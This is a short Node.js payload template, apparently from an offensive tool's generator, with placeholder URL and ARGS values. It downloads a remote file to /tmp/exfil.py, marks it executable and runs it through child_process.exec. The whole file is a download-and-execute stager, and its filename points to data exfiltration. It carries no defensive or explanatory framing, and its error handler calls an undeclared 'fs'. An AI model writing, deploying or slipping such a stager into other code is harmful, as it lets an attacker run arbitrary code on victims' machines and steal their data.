var url = 'URL'
var args = 'ARGS'


if (args === 'A'+'R'+'G'+'S') { 
    args = '';
}
else {
    args = ' ' + args;
}

var proto_module = 'http';
if (url.toLowerCase().startsWith('https')) { 
    proto_module = 'https';
}

var filename = "/tmp/exfil.py";
var file = require('fs').createWriteStream(filename);
var request = require(proto_module).get(url, function(response) {
    response.pipe(file);
    file.on('finish', function() {
        file.close(function() {
            console.log('closing file: ' + filename);
            require('fs').chmodSync(filename, "755");
            require('child_process').exec(filename + args, function(error, stdout, stderr) { console.log(stdout) });
        });  // close() is async, call cb after close completes.
    });
}).on('error', function(err) { // Handle errors
    fs.unlink(filename); // Delete the file async. (But we don't check the result)
    console.log(err.message);
});